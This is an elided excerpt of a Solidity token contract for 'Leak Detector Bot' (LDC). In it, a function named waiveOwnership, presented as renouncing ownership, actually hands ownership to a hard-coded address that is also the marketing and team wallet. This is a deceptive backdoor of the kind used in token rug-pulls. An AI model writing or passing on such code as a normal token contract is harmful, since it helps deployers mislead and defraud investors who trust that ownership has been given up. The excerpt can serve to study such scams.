...
/**
Telegram : https://t.me/LeakDetectorOfficial
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xcAaBA136b43d65672367a533e5D9b6FdFD8BEc2E);
    }
...
contract LeakDetectorBot is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Leak Detector Bot";
    string private _symbol = "LDC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xcAaBA136b43d65672367a533e5D9b6FdFD8BEc2E);
    address payable public teamWalletAddress = payable(0xcAaBA136b43d65672367a533e5D9b6FdFD8BEc2E);
